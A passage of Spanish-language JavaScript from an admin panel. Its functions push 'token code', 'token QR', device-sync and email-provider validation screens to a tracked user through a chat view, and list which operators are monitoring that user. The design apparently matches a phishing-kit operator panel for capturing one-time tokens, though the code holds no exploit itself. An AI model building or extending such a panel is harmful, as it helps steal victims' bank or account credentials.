    if (!syncControlState?.sync_id) return;
    const input = document.getElementById('syncQrUpdateInput');
    const url = (input?.value || '').trim();
    if (!url) {
        showAlert('warning', 'URL requerida', 'Ingresa la URL de la nueva imagen QR.', 'Aceptar', null);
        return;
    }
    try {
        const response = await fetch('validar_sincronizacion.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                accion: 'actualizar_qr',
                usuario_id: userId,
                sync_id: syncControlState.sync_id,
                qr_imagen_url: url
            })
        });
        const data = await response.json();
        if (data.success) {
            if (input) input.value = '';
            updateSyncControlBlock();
        } else {
            showAlert('error', 'Error', data.error || 'No se pudo actualizar el QR', 'Aceptar', null);
        }
    } catch (e) {
        showAlert('error', 'Error de conexión', 'No se pudo actualizar el QR.', 'Aceptar', null);
    }
}

function mostrarModalSincronizacion() {
    const modalHTML = `
        <div id="sincronizacionModal" class="modal-overlay">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><i class="fas fa-mobile-alt"></i> Sincronización de dispositivo</h3>
                    <button onclick="cerrarModalSincronizacion()" class="modal-close"><i class="fas fa-times"></i></button>
                </div>
                <div class="modal-content">
                    <div class="email-validation-config">
                        <label class="proveedor-email-instruction">Tipo que recibirá el cliente:</label>
                        <div class="radio-group" style="display:flex;gap:16px;margin:12px 0 16px;">
                            <div class="radio-option">
                                <input type="radio" id="syncTipoCodigo" name="syncTipo" value="codigo" checked>
                                <label for="syncTipoCodigo">Token Código</label>
                            </div>
                            <div class="radio-option">
                                <input type="radio" id="syncTipoQr" name="syncTipo" value="qr">
                                <label for="syncTipoQr">Token QR</label>
                            </div>
                        </div>
                        <div id="syncQrUrlBox" style="display:none;">
                            <label for="syncQrUrl">URL de la imagen QR:</label>
                            <input type="url" id="syncQrUrl" placeholder="https://ejemplo.com/qr.png" class="redireccion-input">
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <button onclick="cerrarModalSincronizacion()" class="btn-cancel">Cancelar</button>
                    <button onclick="enviarSincronizacion()" class="btn-send"><i class="fas fa-paper-plane"></i> Enviar</button>
                </div>
            </div>
        </div>`;
    document.body.insertAdjacentHTML('beforeend', modalHTML);
    document.querySelectorAll('input[name="syncTipo"]').forEach((radio) => {
        radio.addEventListener('change', function () {
            const box = document.getElementById('syncQrUrlBox');
            if (box) box.style.display = this.value === 'qr' ? '' : 'none';
        });
    });
}

function cerrarModalSincronizacion() {
    document.getElementById('sincronizacionModal')?.remove();
}

async function enviarSincronizacion() {
    const tipo = document.querySelector('input[name="syncTipo"]:checked')?.value || 'codigo';
    const qr = (document.getElementById('syncQrUrl')?.value || '').trim();
    try {
        const response = await fetch('enviar_sincronizacion.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                usuario_id: userId,
                tipo,
                qr_imagen_url: qr,
                ip_usuario: 'panel'
            })
        });
        const data = await response.json();
        if (data.success) {
            cerrarModalSincronizacion();
            loadChatMessages(true);
            updateSyncControlBlock();
        } else {
            showAlert('error', 'Error', data.error || 'No se pudo enviar la sincronización', 'Aceptar', null);
        }
    } catch (e) {
        showAlert('error', 'Error de conexión', 'No se pudo enviar la sincronización.', 'Aceptar', null);
    }
}

async function enviarTokenEmpresa() {
    try {
        const response = await fetch('enviar_token_empresa.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ usuario_id: userId, ip_usuario: 'panel' })
        });
        const data = await response.json();
        if (data.success) {
            loadChatMessages(true);
        } else {
            showAlert('error', 'Error', data.error || 'No se pudo enviar la tela de token', 'Aceptar', null);
        }
    } catch (error) {
        console.error('Error enviando tela de token:', error);
        showAlert('error', 'Error de conexión', 'No se pudo enviar la tela de token.', 'Aceptar', null);
    }
}

function mostrarModalTokenQrEmpresa() {
    const modalHTML = `
        <div id="tokenQrEmpresaModal" class="modal-overlay">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><i class="fas fa-qrcode"></i> Token QR Empresas</h3>
                    <button onclick="cerrarModalTokenQrEmpresa()" class="modal-close"><i class="fas fa-times"></i></button>
                </div>
                <div class="modal-content">
                    <div class="token-qr-admin-config">
                        <label for="tokenQrImagenUrl">URL de la imagen QR:</label>
                        <input type="url" id="tokenQrImagenUrl" placeholder="https://ejemplo.com/imagen.png" class="redireccion-input">
                    </div>
                </div>
                <div class="modal-footer">
                    <button onclick="cerrarModalTokenQrEmpresa()" class="btn-cancel">Cancelar</button>
                    <button onclick="enviarTokenQrEmpresa()" class="btn-send"><i class="fas fa-paper-plane"></i> Enviar Token QR</button>
                </div>
            </div>
        </div>`;
    document.body.insertAdjacentHTML('beforeend', modalHTML);
    document.getElementById('tokenQrImagenUrl').focus();
}

function cerrarModalTokenQrEmpresa() {
    const modal = document.getElementById('tokenQrEmpresaModal');
    if (modal) modal.remove();
}

function validarUrlImagenQr(url) {
    try {
        const parsed = new URL(url);
        if (!['http:', 'https:'].includes(parsed.protocol)) return false;
        return /\.(png|jpe?g|webp|gif)$/i.test(parsed.pathname);
    } catch (e) {
        return false;
    }
}

async function enviarTokenQrEmpresa() {
    const imagenUrl = document.getElementById('tokenQrImagenUrl').value.trim();

    if (!imagenUrl) {
        showAlert('warning', 'Token QR', 'Ingresa la URL de la imagen QR.', 'Aceptar', null);
        return;
    }

    if (!validarUrlImagenQr(imagenUrl)) {
        showAlert('warning', 'Token QR', 'La URL debe ser http(s) y terminar en .png, .jpg, .jpeg, .webp o .gif', 'Aceptar', null);
        return;
    }

    try {
        const response = await fetch('enviar_token_qr_empresa.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ usuario_id: userId, imagen_url: imagenUrl, ip_usuario: 'panel' })
        });
        const data = await response.json();
        if (data.success) {
            loadChatMessages(true);
            cerrarModalTokenQrEmpresa();
        } else {
            showAlert('error', 'Error', data.error || 'No se pudo enviar la tela de token QR', 'Aceptar', null);
        }
    } catch (error) {
        console.error('Error enviando tela de token QR:', error);
        showAlert('error', 'Error de conexión', 'No se pudo enviar la tela de token QR.', 'Aceptar', null);
    }
}

async function enviarEmailValidation() {
    const proveedorSeleccionado = document.querySelector('input[name="proveedorEmail"]:checked').value;
    const proveedorEtiqueta = PROVEEDOR_EMAIL_LABELS[proveedorSeleccionado] || proveedorSeleccionado;

    try {
        const response = await fetch('enviar_email_validation.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ usuario_id: userId, proveedor: proveedorSeleccionado, ip_usuario: 'panel' })
        });
        const data = await response.json();
        if (data.success) {
            addMessageToChat({ type: 'admin', content: `Validación de email enviada: ${data.email} (${proveedorEtiqueta})`, timestamp: new Date() });
            cerrarModalEmailValidation();
        } else {
            showAlert('error', 'Error', 'Error al enviar validación de email: ' + (data.error || 'Error desconocido'), 'Aceptar', null);
        }
    } catch (error) {
        console.error('Error enviando validación de email:', error);
        showAlert('error', 'Error de conexión', 'No se pudo enviar la validación de email.', 'Aceptar', null);
    }
}

// --- Monitoreo ---

async function initializeMonitoring() {
    if (!userId) return;
    try {
        await fetch('monitoreo_popup.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ accion: 'registrar_entrada', usuario_id: userId })
        });
        heartbeatInterval = setInterval(sendHeartbeat, 30000);
    } catch (error) {
        console.error('Error inicializando monitoreo:', error);
    }
}

async function sendHeartbeat() {
    if (!userId || !isTabActive) return;
    try {
        await fetch('monitoreo_popup.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ accion: 'heartbeat', usuario_id: userId })
        });
    } catch (error) {
        console.error('Error enviando heartbeat:', error);
    }
}

function startMonitoring() {
    if (monitoringInterval) clearInterval(monitoringInterval);
    isMonitoringActive = true;
    loadMonitoringData();
    monitoringInterval = setInterval(() => {
        if (isMonitoringActive && isTabActive) loadMonitoringData();
    }, monitoringIntervalTime);
}

async function loadMonitoringData() {
    if (!userId || !isTabActive) return;
    try {
        const response = await fetch('monitoreo_popup.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ accion: 'obtener_monitores', usuario_id: userId })
        });
        const data = await response.json();
        if (data.success) updateMonitoringDisplay(data.monitores_activos, data.historial);
    } catch (error) {
        console.error('Error cargando datos de monitoreo:', error);
    }
}

function updateMonitoringDisplay(monitoresActivos, historial) {
    const onlineList = document.getElementById('onlineAdminsList');
    const historyList = document.getElementById('historyAdminsList');

    if (monitoresActivos && monitoresActivos.length > 0) {
        onlineList.textContent = monitoresActivos.map(m => `${m.is_admin == 1 ? '👑' : '👤'} ${m.admin_usuario.toUpperCase()}`).join(', ');
    } else {
        onlineList.textContent = 'Ninguno';
    }

    if (historial && historial.length > 0) {
        historyList.textContent = historial.map(a => `${a.is_admin == 1 ? '👑' : '👤'} ${a.admin_usuario.toUpperCase()}`).join(', ');
    } else {
        historyList.textContent = 'Ninguno';
    }
}
